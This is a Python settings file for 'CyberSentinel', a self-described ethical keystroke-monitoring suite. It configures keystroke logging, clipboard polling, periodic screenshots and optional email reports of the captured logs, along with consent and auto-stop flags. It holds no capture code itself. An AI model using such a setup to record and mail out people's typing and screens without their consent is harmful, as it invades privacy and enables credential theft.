"""
CyberSentinel - Centralized Configuration
==========================================
All application settings are managed here.
Modify these values to customize behavior.
"""

import os
from pathlib import Path
from datetime import datetime


# ──────────────────────────────────────────────
#  📁 PATH CONFIGURATION
# ──────────────────────────────────────────────
BASE_DIR = Path(__file__).resolve().parent.parent
LOG_DIR = BASE_DIR / "logs"
SCREENSHOT_DIR = LOG_DIR / "screenshots"
EXPORT_DIR = BASE_DIR / "exports"
KEY_DIR = BASE_DIR / ".keys"

# Ensure directories exist
for directory in [LOG_DIR, SCREENSHOT_DIR, EXPORT_DIR, KEY_DIR]:
    directory.mkdir(parents=True, exist_ok=True)


# ──────────────────────────────────────────────
#  🔐 ENCRYPTION SETTINGS
# ──────────────────────────────────────────────
ENCRYPTION_ENABLED = True
KEY_FILE = KEY_DIR / "sentinel.key"
KEY_ROTATION_HOURS = 24  # Rotate encryption key every N hours


# ──────────────────────────────────────────────
#  ⌨️ KEYLOGGER SETTINGS
# ──────────────────────────────────────────────
LOG_FILE_PREFIX = "keystroke_log"
LOG_FORMAT = "csv"  # Options: "csv", "json", "txt"
BUFFER_SIZE = 50  # Flush to disk after N keystrokes
FLUSH_INTERVAL_SECONDS = 30  # Max seconds before auto-flush
CAPTURE_SPECIAL_KEYS = True  # Log special keys (Shift, Ctrl, etc.)
CAPTURE_TIMESTAMPS = True  # Timestamp each keystroke
SESSION_ID = datetime.now().strftime("%Y%m%d_%H%M%S")


# ──────────────────────────────────────────────
#  📋 CLIPBOARD MONITOR SETTINGS
# ──────────────────────────────────────────────
CLIPBOARD_ENABLED = True
CLIPBOARD_POLL_INTERVAL = 3  # Seconds between clipboard checks
CLIPBOARD_LOG_FILE = LOG_DIR / f"clipboard_{SESSION_ID}.enc"


# ──────────────────────────────────────────────
#  📸 SCREENSHOT SETTINGS
# ──────────────────────────────────────────────
SCREENSHOT_ENABLED = True
SCREENSHOT_INTERVAL = 60  # Seconds between captures
SCREENSHOT_QUALITY = 70  # JPEG quality (1-100)
SCREENSHOT_FORMAT = "png"


# ──────────────────────────────────────────────
#  📧 EMAIL REPORTING
# ──────────────────────────────────────────────
EMAIL_ENABLED = False  # Disabled by default for safety
EMAIL_SMTP_SERVER = os.getenv("SENTINEL_SMTP_SERVER", "smtp.gmail.com")
EMAIL_SMTP_PORT = int(os.getenv("SENTINEL_SMTP_PORT", "587"))
EMAIL_SENDER = os.getenv("SENTINEL_EMAIL_SENDER", "")
EMAIL_PASSWORD = os.getenv("SENTINEL_EMAIL_PASSWORD", "")
EMAIL_RECIPIENT = os.getenv("SENTINEL_EMAIL_RECIPIENT", "")
EMAIL_REPORT_INTERVAL = 3600  # Send report every N seconds


# ──────────────────────────────────────────────
#  🖥️ DASHBOARD SETTINGS
# ──────────────────────────────────────────────
DASHBOARD_REFRESH_RATE = 1  # Dashboard refresh in seconds
MAX_DISPLAY_KEYS = 200  # Max recent keys shown in dashboard
THEME_PRIMARY = "cyan"
THEME_SECONDARY = "magenta"
THEME_ACCENT = "green"
THEME_WARNING = "yellow"
THEME_ERROR = "red"


# ──────────────────────────────────────────────
#  ⚖️ ETHICAL SAFEGUARDS
# ──────────────────────────────────────────────
REQUIRE_CONSENT = True  # Must accept consent before running
CONSENT_LOG_FILE = LOG_DIR / "consent_records.json"
AUTO_STOP_HOURS = 8  # Auto-stop after N hours
WATERMARK_LOGS = True  # Add identifying watermarks to logs


# ──────────────────────────────────────────────
#  🎨 APPLICATION METADATA
# ──────────────────────────────────────────────
APP_NAME = "CyberSentinel"
APP_VERSION = "1.0.0"
APP_TAGLINE = "Ethical Keystroke Monitoring Suite"
APP_AUTHOR = "CyberSecurity Research Team"

BANNER = r"""
   ______      __              _____            __  _            __
  / ____/_  __/ /_  ___  _____/ ___/___  ____  / /_(_)___  ___  / /
 / /   / / / / __ \/ _ \/ ___/\__ \/ _ \/ __ \/ __/ / __ \/ _ \/ / 
/ /___/ /_/ / /_/ /  __/ /   ___/ /  __/ / / / /_/ / / / /  __/ /  
\____/\__, /_.___/\___/_/   /____/\___/_/ /_/\__/_/_/ /_/\___/_/   
     /____/                                                        
"""
